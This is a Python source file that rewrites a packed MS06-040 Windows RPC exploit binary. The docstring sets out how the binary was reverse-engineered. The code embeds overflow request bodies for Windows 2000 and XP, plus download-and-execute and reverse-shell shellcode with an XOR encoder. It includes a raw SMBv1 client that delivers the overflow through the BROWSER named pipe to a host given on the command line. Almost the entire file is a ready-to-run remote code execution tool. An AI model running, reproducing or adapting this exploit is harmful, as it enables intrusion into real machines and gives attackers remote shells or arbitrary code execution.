#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
rpc_exp.py -- Python rewrite of the `ms06040rpc_unpacked_v2` MS06-040 exploit.

Binary analysis (via IDA Pro + x32dbg memory dump) of
`ms06040rpc_unpacked_v2.exe`:

    This is a *second, modified build* of the classic Mika MS06-040 RPC
    exploit.  Like `ms06040rpc.exe` it is memory-packed: `.nsp0` carries the
    unpacking stub, `.nsp1` the compressed body, and at runtime the OEP
    (0x4018F6) decompresses the real logic into 0x401000..0x40A000 before
    jumping to it.  (IDA views the on-disk PE as `.nsp0` rawsize=0, so the
    unpacked image had to be read from a memory dump taken in x32dbg.)

    Recovered structure (unpacked image, VA base 0x400000):

        sub_401470  (0x401470)  main(): parses the CLI, formats
                        "\\<host>\\pipe"  and  "\\<host>\\pipe\\BROWSER"
                        with sprintf (0x407B48/0x407B34), opens the BROWSER
                        named pipe, binds the RPC interface (sub_401000) and
                        hands the payload to sub_4010C0.
        sub_401000  (0x401000)  builds + sends a DCERPC BIND  for the remote
                        RPC interface over the open named pipe.
        sub_4010C0  (0x4010C0)  builds a DCERPC REQUEST (opnum 0x1F =
                        NetApi32 NetpwPathCanonicalize) carrying the
                        OS-specific overflow body + XOR-encoded shellcode and
                        sends it (once for os_type 1, twice for os_type 2).
        sub_401360  (0x401360)  URL download-exec shellcode builder
                        (finds an XOR byte that avoids HTTP/pipe characters,
                        XOR-encodes the URL tail, stores key at 0x4085F9 and
                        size at 0x4085F4).

    Interface / constants recovered:

        BIND abstract syntax UUID  6a281939-0cb1-11d0-9ba8-00c04fd92ef5  (v0.0)
                                     (the BROWSER RPC interface; UUID fields
                                      stored big-endian as printed, unlike the
                                      original build's mixed-endian
                                      4b324fc8-1670-01d3-1278-5a47bf6ee188)
        BIND transfer syntax       045d888a-eb1c-c911-9fe8-08002b104860  (NDR
                                     v2.0) -- same as the original build
        REQUEST PDU (0x407A34)     0500000310000000 <len> 01000000 <alloc> 00001f00
                                     (opnum 0x1F = NetpwPathCanonicalize)
        payload bodies              0x407278 (win2k, len 0x468), 0x4076E4
                                     (winxp, len 0x304) -- byte-identical to the
                                     original build (WIN2000_BODY / WINXP_BODY)
        shellcode templates         0x407030 (download), 0x407158 (reverse)
                                     -- byte-identical to the original build

    Transport: the original used `WNetAddConnection2A` + `CreateFileA` on
    "\\host\\pipe\\BROWSER", then `WriteFile`.  This port drives the same
    sequence over a raw SMBv1 client (negotiate -> session setup -> tree
    connect IPC$ -> NT_CREATE_ANDX on "\\BROWSER" -> WRITE_ANDX) using only
    the Python stdlib.

  Footprint: only the Python stdlib (raw SMBv1 over TCP:445).
"""

import socket
import struct
import sys

DEFAULT_PORT = 445
DEFAULT_TIMEOUT = 8.0            # seconds (C original had no timeout; harden)

# ---------------------------------------------------------------------------
# SMB1 opcodes (from the impacket SMB class / MS-CIFS).
# ---------------------------------------------------------------------------
SMB_COM_NEGOTIATE = 0x72
SMB_COM_SESSION_SETUP_ANDX = 0x73
SMB_COM_TREE_CONNECT_ANDX = 0x75
SMB_COM_NT_CREATE_ANDX = 0xA2
SMB_COM_WRITE_ANDX = 0x2F
SMB_COM_LOGOFF_ANDX = 0x74

SMB_FLAGS_CANONICAL = 0x10

# Dialects for Negotiate (same list the original build offers).
DIALECTS = b"\x02PC NETWORK PROGRAM 1.0\x00" \
           b"\x02MICROSOFT NETWORKS 1.03\x00" \
           b"\x02MICROSOFT NETWORKS 3.0\x00" \
           b"\x02LANMAN1.0\x00" \
           b"\x02LM1.2X002\x00" \
           b"\x02DOS LANMAN2.1\x00" \
           b"\x02LANMAN2.1\x00" \
           b"\x02NT LANMAN 1.0\x00" \
           b"\x02NT LM 0.12\x00" \
           b"\x02SMB 2.002\x00" \
           b"\x02SMB 2.??\x00"

# ---------------------------------------------------------------------------
# Recovered literal payloads (extracted from the unpacked image).
# ---------------------------------------------------------------------------
# BROWSER RPC interface abstract syntax (v0.0) bound before the request.
# UUID fields stored big-endian as printed (verified against the 0x4079EC
# BIND template in the unpacked image).
BROWSER_UUID = "6a281939-0cb1-11d0-9ba8-00c04fd92ef5"
# NDR v2 transfer syntax.
NDR_UUID = "045d888a-eb1c-c911-9fe8-08002b104860"

# OS-specific NetApi32 request bodies (shellcode slot starts at offset 56).
WIN2000_BODY = bytes.fromhex("756b225601000000000000000100000000001bf71502000000000000150200004af942f5934a933793f5929b93274f474937d6fcfd274a9090409f9f9b3ffdf9434b9240434e964990933f919896f84a993f43f5409f479b98419f4b3f40424a92904f9246964041fd413f96434e49434f91fc4f933f27969137979898984af5919693934797499697f5d64791919042489842493f9390934e4747999227fdfdfc4b914b434bd6463792f5464f999fd697f59bf843f8974f3f4127969227934b989b4847f89348fc98f5914f9f424a484a974e914990f8914f929692d647989040f5fc46f546f9d64ffc9891419148fc984949fc41374646f5903f484a40374741f593f84092494a37fdf8939b46474792929293999393fd3f42479096924f4a4a9393463ff9fd909b97479b9149d697914b402746429148974e93909649f5f9434b41f548fd4b4143404bf997fdfcf9fcf9969f99d6414ad6274a992748f5f99037429140fc4b4196909ffc47f527f59247964a4f9246984b923f41f846d6fc272749499f274f9246d641f9373797fc91f5464748fd96f590904b9bfdf8f84a274691999393d697f9439bfcd6fd41d6d69f974f499bd6423740f89bfc90fd42d64149973f9993f8492797d69247934e9f37d6fdd64b4246914a9f9149904e49489827d64690433ff9f8483f404b9f379bd6fd40d69947469790494efd933f3f4ad64096d6f927fd4f4390f842d6924396914a464ffd92fc403797f5f597924b99f837f5409840fc42f94b99434097484e4941f99049fc47fd9348424a40d69637274349924f4193d64e9f43984ed6963f9f4b4a994737fcf9d699f8274b4790f9494bd6fd99904e98fd4b96434f3f4a90f94296404e3799484049279792d637933746fd96429bf89b4b9740914b93d64f429f4b4ef5fd9199fc9992273ff949fcf5f5373fd6924bf93f974b9b4f4947473ffd98d6374b4a9190273f97f9d6d6904040434340f8909692489627f99996964f964b4f98f9419399d69b974e4efd46379f40fd97479b4143424e404e3f37979f37fd92989091fd90f8fc939691414f9f4692274f3f4037914e4ff5993f4a93999ff59046934327274f4e91426a3559d9eed97424f45b817313d3457da283ebfce2f45281824d2cba395e3b017da2d3ce389e583978dad2aaf6edcbce2282d2ae3429e7ce7c4ce285e40e578509a5128f70a311ae8999876179d736ce2286d2ae1b29df0ef6fdcf449629cfce7c495a1959a61074bdc658054d27133d71299349f6d2cfe8f6cadbae742953f57da2d3ce159e8c748bc285cc8521133e2dca3c8b9dc2bbdd8328dd128245b028198cb63d1882fc265dccb6315dd7a0200f82e2774e82e2774e82fc0439e6f3635b82bd200982bf2a1ec3bf220fcda6355de3b72814ccba3609d0b23112d0a0654c90e06552e397017da204080200040802000408020004080200040802000408020004080200040802000408020004080200040802000408020004080200040802000408020004080200000093c8f5000000020000000000000002000000eb0200002800000000000000")
WINXP_BODY   = bytes.fromhex("0e4c9fe60100000000000000010000000000c852630100000000000063010000fd4e4a48434f479993f83f4098929f919343f5904ed69227914899f549434e93494390984a984e4f2746f996d69040fcfc9391f84f2798424f964841904a429ffd989191464141923ffc99934e96409198439693f5d64f9b279f9bfd993ffd4fd6914a9698fdf99b3741fc9f424a40f8434a98419191f9d6d69b49423f90fc9b4b92fc3796fc4198fc4f4e91974a9249929f91414a41982798d69148fcfcf54b9f9ffcd6f8496a3559d9eed97424f45b81731360d221ae83ebfce2f4e116de419f2d6552889621ae60596492ebae24d6613daae178597e8e61396825545920405112b802e41255a9a1182cafa239d59534f625db85597e8a613947256c99aaf17cd3ca257c592045e98e05aaa3e3e1caeb92112ba0aa2d2520deaade7c7faac668392825e06221ae605949923fe3d7ce365bd92da0a971c68f1cc1ce084adf246e85de4903bf458005aa448e4fb101c005a601db13b7538e51e0128e51e0128e4f9365ea40f4078e0eb7558e0cbd42cf0cb553c115a201ef04bf48c009a155dc01a64edc13f2109c53f20eef249621ae3176574e6559454d697349397632395274555a576c6e6b4b5164394e5532733171446f554d446f703358477035347a6e614c6d4e39305039474d645046634b61746362384469767639496151415a37366e6a6f6d7a6e464346794e6e4c4d53487a4677784763525a35306f423342573856597a476b78626b766879634b684269465354394a6e387475727850696d61577062763638747769626b4a59385275636c5a627732516f4b754c6d32486c504f3753487434654f35586e475369564862365278357a614b376f6449314b6f3831354c33610a080200776d4f36487a4779040802007a373843475059783431796855304c6b61436b70676870494d5574557345745a040802005a7a446856754e6c040802007a526653665a544975566a63755a66554c6d644d45364262743436465458664600004307c700000001000000000000000100000000008dc16100000000000000")

# Shellcode templates (byte-identical to the original build).
DOWNLOAD_TEMPL = bytes.fromhex("eb105b4b33c966b9eeee80340bffe2faeb05e8ebffffffe9f20000005f64a1300000008b400c8b701cad8b68088bf76a0459e892000000e2f9686f6e00006875726c6d54ff168be8e87c00000083ec208bdc6a2053ff5604c704035c612e65c74403047865000033c05050535750ff56108bec81edbb000000895da08b5e08895da48be581ecdd0000008d85a8ffffff6a4459c6000040e2fac745a8440000008bf48d45ec508d4da8516a006a006a206a006a006a006a008b55a052ff55a43bf4e8a4070000ff560c51568b753c8b742e7803f5568b762003f533c94941ad03c533db0fbe103ad67408c1cb0d03da40ebf13b1f75e75e8b5e2403dd668b0c4b8b5e1c03dd8b048b03c5ab5e59c3e809ffffff8e4e0eecc179e5b872feb316efcee060361a2f7000")
REVERSE_TEMPL = bytes.fromhex("fc6aeb4de8f9ffffff608b6c24248b453c8b7c057801ef8b4f188b5f2001eb498b348b01ee31c099ac84c07407c1ca0d01c2ebf43b54242875e58b5f2401eb668b0c4b8b5f1c01eb032c8b896c241c61c331db648b43308b400c8b701cad8b40085e688e4e0eec50ffd6665366683332687773325f54ffd068cbedfc3b50ffd65f89e56681ed0802556a02ffd068d909f5ad57ffd65353535343534353ffd068ca6e840b666810e1665389e19568ecf9aa6057ffd66a105155ffd0666a646668636d6a505929cc89e76a4489e231c0f3aa9589fdfe422dfe422c8d7a38ababab6872feb316ff7528ffd65b57525151516a0151515551ffd068add905ce53ffd66affff37ffd068e779c679ff7504ffd6ff77fcffd068efcee06053ffd6ffd000")

# Bytes an XOR-encoded byte must never collide with (avoid HTTP/pipe chars).
BAD_XOR = frozenset((0x26, 0x3d, 0x3f, 0x40, 0x00, 0x0d, 0x0a, 0x5c, 0x5f, 0x2e, 0x2f))

# NetApi32 NetpwPathCanonicalize -> RPC opnum 31.
OPNUM = 0x1F


def log(fmt, *args):
    sys.stderr.write((fmt % args).rstrip("\n") + "\n")


# ---------------------------------------------------------------------------
# DCERPC frame builders (reconstructed from the unpacked image).
# ---------------------------------------------------------------------------
def build_bind(call_id=1):
    """72-byte DCERPC BIND to the BROWSER RPC interface (NDR v2).

    Reproduced byte-for-byte from the 0x4079EC BIND template in the unpacked
    image.  Note this build stores the UUID fields **big-endian as printed**
    (not the usual mixed-endian RPC layout): abstract syntax is
    ``6a281939-0cb1-11d0-9ba8-00c04fd92ef5`` / v0.0, transfer syntax is the
    standard NDR ``045d888a-eb1c-c911-9fe8-08002b104860`` / v2.0.
    """
    abstract = bytes.fromhex("6a2819390cb1d0119ba800c04fd92ef5") + bytes.fromhex("00000000")
    transfer = bytes.fromhex("045d888aeb1cc9119fe808002b104860") + bytes.fromhex("02000000")
    ctx_item = struct.pack("<HBB", 0, 1, 0) + abstract + transfer
    bind_pdu = struct.pack("<HHLBBH", 0x10B8, 0x10B8, 0, 1, 0, 0) + ctx_item
    header = struct.pack("<BBBBIHHI", 5, 0, 0x0B, 0x03, 0x10,
                         16 + len(bind_pdu), 0, call_id)
    return header + bind_pdu


def build_request(frag_len, alloc_hint, opnum=OPNUM):
    """24-byte DCERPC REQUEST header (recovered from the 0x407A34 template)."""
    return struct.pack("<4BIHHIIHH",
                       5, 0, 0, 0x03, 0x10,
                       frag_len, 0, 1, alloc_hint, 0, opnum)


def _assemble_packet(shellcode, body):
    """Concatenate the 24-byte DCERPC REQUEST header + body, then splice the
    XOR-encoded shellcode into the NetApi32 stub's code slot (offset 56)."""
    frag_len = 24 + len(body)                 # full on-wire packet length
    pkt = bytearray(build_request(frag_len, len(body)) + body)
    pkt[56:56 + len(shellcode)] = shellcode
    return bytes(pkt)


# ---------------------------------------------------------------------------
# Shellcode builders (reconstructed from sub_4010C0 / sub_401360).
# ---------------------------------------------------------------------------
def build_reverse_shellcode(addr, port):
    """Patch LHOST/LPORT into the reverse_tcp stage (offsets recovered from
    dword_4071F8 / word_4071FE -- i.e. the template's 0xA0 / 0xA6 slots)."""
    buf = bytearray(REVERSE_TEMPL)
    struct.pack_into("<4s", buf, 0xA0, socket.inet_aton(addr))
    struct.pack_into("<H",  buf, 0xA6, socket.htons(port))
    return bytes(buf)


def _find_xor_byte(buf, size):
    v3 = 0xFF
    while True:
        if all((v3 ^ buf[i]) not in BAD_XOR for i in range(23, size)):
            return v3
        v3 -= 1
        if not v3:
            return None


def build_download_shellcode(url):
    """Reconstruct sub_401360: URL-stage download-exec shellcode, XOR-encoded."""
    raw_url = url.encode("latin-1", "replace")
    buf = bytearray(0x400)
    buf[:len(DOWNLOAD_TEMPL)] = DOWNLOAD_TEMPL
    size = len(raw_url) + 298
    buf[0x127:0x127 + len(raw_url)] = raw_url
    xor = _find_xor_byte(buf, size)
    if xor is None:
        log("[-] No xor byte found!")
        return None
    log("[+] Find XOR Byte: 0x%02X", xor)
    for i in range(23, size):
        buf[i] ^= xor
    struct.pack_into("<H", buf, 0x08, size)   # decoder loop count  (word_4085F4)
    buf[0x0D] = xor                          # decoder XOR key     (byte_4085F9)
    return bytes(buf[:size])


# ---------------------------------------------------------------------------
# Minimal SMBv1 client (raw named-pipe transport, stdlib only).
# ---------------------------------------------------------------------------
class SMBError(Exception):
    pass


class SMBv1Pipe:
    """SMBv1 client over a connected TCP socket, extended to open and write a
    remote named pipe -- mirrors the original's CreateFileA + WriteFile."""

    def __init__(self, sock, timeout=None):
        self.sock = sock
        self.timeout = timeout
        self.mid = 0
        self.uid = 0
        self.tid = 0

    # -- low-level ---------------------------------------------------------
    def _next_mid(self):
        self.mid = (self.mid + 1) & 0xFFFF
        return self.mid

    def _recv_exact(self, n):
        buf = b""
        self.sock.settimeout(self.timeout)
        while len(buf) < n:
            chunk = self.sock.recv(n - len(buf))
            if not chunk:
                raise SMBError("connection closed while reading SMB reply")
            buf += chunk
        return buf

    def _recv_netbios(self):
        nb = self._recv_exact(4)
        size = ((nb[0] & 0x0F) << 16) | (nb[1] << 8) | nb[2]
        if nb[0] & 0x80:
            size = ((nb[1] & 0x01) << 16) | (nb[2] << 8) | nb[3]
        data = self._recv_exact(size - 4) if size > 4 else b""
        return bytes(nb) + data

    def _send(self, smb_payload):
        msg = b"\x00" + struct.pack("<I", len(smb_payload))[1:] + smb_payload
        self.sock.sendall(msg)

    def _read_reply(self):
        nb = self._recv_netbios()
        if len(nb) < 4 or nb[0] != 0 or len(nb) < 36:
            return nb
        cmd = nb[4]
        status = struct.unpack_from("<I", nb, 5)[0]
        if status:
            raise SMBError("SMB status 0x%08X for command 0x%02X" % (status, cmd))
        return nb

    # -- SMB1 commands -----------------------------------------------------
    def negotiate(self):
        hdr = self._smb_header(SMB_COM_NEGOTIATE, 0, 0)
        body = b"\x11" + struct.pack("<H", len(DIALECTS)) + DIALECTS
        self._send(hdr + body)
        reply = self._read_reply()
        if len(reply) >= 68 and reply[8:12] == b"\xffSMB":
            return "smb2"                 # target only speaks SMB2
        return "smb1"

    def session_setup(self, user=b"", pwd=b"", domain=b""):
        mid = self._next_mid()
        hdr = self._smb_header(SMB_COM_SESSION_SETUP_ANDX, 0, 0, mid=mid)
        bl = 0
        body = b"\xff" + b"\x00" + b"\x00" * 4 + b"\x00" * 2 + b"\x01" + b"\x00" * 2 \
            + b"\xff" + b"\xff" + struct.pack("<IHH", bl, 0x01, 0x0100) \
            + b"\x00\x00\x00\x00\x00\x00\x00\x00" \
            + struct.pack("<H", len(pwd)) + pwd + domain + user
        self._send(hdr + b"\x00\x0c" + b"\x00" * 2 + b"\xff\x00" + body)
        reply = self._read_reply()
        self.uid = struct.unpack_from("<H", reply, 0x20)[0] if len(reply) > 0x22 else 0
        return reply

    def tree_connect(self, path):
        mid = self._next_mid()
        hdr = self._smb_header(SMB_COM_TREE_CONNECT_ANDX, 0, self.uid, mid=mid)
        full = path if isinstance(path, bytes) else path.encode()
        body = b"\xff" + b"\x00" + b"\x00\x00" + b"\x00\x00\x00\x00" \
            + b"\x00" + b"\x00\x00" \
            + struct.pack("<H", len(full)) + full + b"\x00\x00"
        self._send(hdr + b"\x00\x0c" + b"\x00\x00" + 8 * b"\x00" + b"\x00\x08" + body)
        reply = self._read_reply()
        self.tid = struct.unpack_from("<H", reply, 0x1C)[0]
        return reply

    def nt_create(self, filename):
        """SMB_COM_NT_CREATE_ANDX (0xA2) -- opens a named pipe (BROWSER).

        Byte layout reproduced from impacket's SMBNtCreateAndX serialisation
        (ASCII filename, no UNICODE flag): WordCount 0x18 + 48-byte
        parameters + ByteCount + filename data, with no pad byte.
        """
        mid = self._next_mid()
        hdr = self._smb_header(SMB_COM_NT_CREATE_ANDX, self.tid, self.uid, mid=mid)
        name = filename if isinstance(filename, bytes) else filename.encode()
        params = b"\xff\x00\x00\x00"            # AndXCommand/reserved/offset
        params += struct.pack("<B", 0)          # _reserved
        params += struct.pack("<H", len(name))  # FileNameLength (no trailing NUL)
        params += struct.pack("<I", 0x16)       # CreateFlags
        params += struct.pack("<I", 0)          # RootDirectoryFID
        params += struct.pack("<I", 0xC0000000) # DesiredAccess (GENERIC_RW)
        params += struct.pack("<II", 0, 0)      # AllocationSize (lo, hi)
        params += struct.pack("<I", 0)          # FileAttributes
        params += struct.pack("<I", 3)          # ShareAccess (R|W)
        params += struct.pack("<I", 3)          # Disposition (FILE_OPEN_IF)
        params += struct.pack("<I", 0x40)       # CreateOptions (impacket default)
        params += struct.pack("<I", 2)          # Impersonation
        params += struct.pack("<B", 3)          # SecurityFlags
        # ASCII filename, NUL-terminated (matches impacket's AsciiStructure).
        data = name + b"\x00"
        body = b"\x18" + params + struct.pack("<H", len(data)) + data
        self._send(hdr + body)
        reply = self._read_reply()
        # response params: AndX(4) Oplock(1) Fid(2) ... -> Fid at offset 0x26.
        if len(reply) >= 0x29:
            fid = struct.unpack_from("<H", reply, 0x26)[0]
            return fid
        raise SMBError("NT_CREATE_ANDX returned a short reply")

    def write_andx(self, fid, data):
        """SMB_COM_WRITE_ANDX (0x2F) -- writes to the named pipe.

        Byte layout reproduced from impacket's SMBWriteAndX serialisation:
        WordCount 0x0E + 28-byte parameters + ByteCount + raw data (no pad,
        no buffer-format byte).  DataOffset is the absolute offset of the
        data from the start of the SMB message (header+wordcount+params+bytecount).
        """
        mid = self._next_mid()
        hdr = self._smb_header(SMB_COM_WRITE_ANDX, self.tid, self.uid, mid=mid)
        # DataOffset computed like impacket's `len(smb)`: 32-byte header +
        # 1-byte WordCount + 28-byte parameters + 2-byte ByteCount.
        data_off = 32 + 1 + 28 + 2
        params = b"\xff\x00\x00\x00"            # AndXCommand/reserved/offset
        params += struct.pack("<H", fid)        # Fid
        params += struct.pack("<I", 0)          # Offset
        params += struct.pack("<I", 0xff)       # Reserved
        params += struct.pack("<H", 8)          # WriteMode (WRITE_THROUGH)
        params += struct.pack("<H", len(data))  # Remaining
        params += struct.pack("<H", 0)          # DataLength_Hi
        params += struct.pack("<H", len(data))  # DataLength
        params += struct.pack("<H", data_off)   # DataOffset
        params += struct.pack("<I", 0)          # HighOffset
        body = b"\x0e" + params + struct.pack("<H", len(data)) + data
        self._send(hdr + body)
        return self._read_reply()

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass

    # -- helpers -----------------------------------------------------------
    def _smb_header(self, cmd, tid, uid, mid=None):
        """32-byte SMB1 header, matching impacket's NewSMBPacket layout."""
        mid = self._next_mid() if mid is None else mid
        pid = 0x1234
        flags2 = 0x0001 | 0x0002 | 0x0008            # LONG_NAMES|EAS|COMPRESSED
        return (b"\xffSMB"
                + struct.pack("<B", cmd)                  # Command
                + struct.pack("<B", 0)                    # ErrorClass
                + struct.pack("<B", 0)                    # reserved
                + struct.pack("<H", 0)                    # ErrorCode
                + struct.pack("<B", SMB_FLAGS_CANONICAL)  # Flags1
                + struct.pack("<H", flags2)               # Flags2
                + struct.pack("<H", 0)                    # PIDHigh
                + b"\x00" * 8                             # SecurityFeatures
                + struct.pack("<H", 0)                    # Reserved
                + struct.pack("<H", tid)                  # Tid
                + struct.pack("<H", pid)                  # Pid
                + struct.pack("<H", uid)                  # Uid
                + struct.pack("<H", mid))                 # Mid


# ---------------------------------------------------------------------------
# run_function -- what the original main() feeds.
# ---------------------------------------------------------------------------
def run_function(host, mode="download", url=None, raddr=None, rport=None,
                 os_type=1, port=DEFAULT_PORT, timeout=DEFAULT_TIMEOUT):
    """Exploit MS06-040 against `host` over the BROWSER named pipe."""
    log("^_^Mika is telling you:don't play with fire!^o^")
    mode = (mode or "download").lower()

    if mode == "reverse":
        shellcode = build_reverse_shellcode(raddr, rport)
    elif mode == "download":
        if not url:
            log("[-] download mode requires a URL")
            return 1
        shellcode = build_download_shellcode(url)
    else:
        log("[-] unknown payload mode: %s", mode)
        return 1
    if not shellcode:
        return 1

    sock = None
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        s = SMBv1Pipe(sock, timeout)

        # 1) negotiate + session + IPC$ tree connect (WNetAddConnection2A)
        if s.negotiate() != "smb1":
            raise SMBError("target does not support SMBv1")
        s.session_setup()
        s.tree_connect(b"\\\\%s\\IPC$" % host.encode())

        # 2) open the BROWSER named pipe (CreateFileA "\\host\pipe\BROWSER")
        fid = s.nt_create(b"\\BROWSER")

        # 3) bind the BROWSER RPC interface (sub_401000)
        s.write_andx(fid, build_bind())

        # 4) send the NetpwPathCanonicalize overflow request(s) (sub_4010C0)
        if os_type == 1:                     # Windows 2000 SP4
            log("Sending payload...finish")
            s.write_andx(fid, _assemble_packet(shellcode, WIN2000_BODY))
        else:                                # Windows XP SP1 / Server 2003
            log("Sending payload1...finish")
            s.write_andx(fid, _assemble_packet(shellcode, WINXP_BODY))
            log("Sending payload2...finish")
            s.write_andx(fid, _assemble_packet(shellcode, WINXP_BODY))
        return 0
    except Exception as e:
        log("[-] %s", e)
        return 1
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass


def main():
    """CLI driver mirroring the original `sub_401470` argument handling.

      rpc-exp <host> <download url> <os type>
      rpc-exp <host> <reverse addr> <reverse port> <os type>
    """
    args = sys.argv[1:]
    if len(args) < 3:
        log(_usage())
        return 1
    host = args[0]
    os_type = 1
    mode = "reverse" if len(args) >= 4 else "download"
    if mode == "download":
        url = args[1]
        try:
            os_type = int(args[2])
        except ValueError:
            os_type = 1
        return run_function(host, mode="download", url=url, os_type=os_type)
    else:
        raddr = args[1]
        try:
            rport = int(args[2])
        except ValueError:
            rport = 80
        try:
            os_type = int(args[3])
        except ValueError:
            os_type = 1
        return run_function(host, mode="reverse", raddr=raddr, rport=rport,
                            os_type=os_type)


def _usage():
    return ("Usage:\n"
            "\t%s <host> <download url> <os type>\n"
            "\t%s <host> <reverse addr> <reverse port> <os type>\n"
            "\t<os type> 1: win2000sp4  2: winxpsp1\n") % (sys.argv[0], sys.argv[0])


if __name__ == "__main__":
    sys.exit(main())
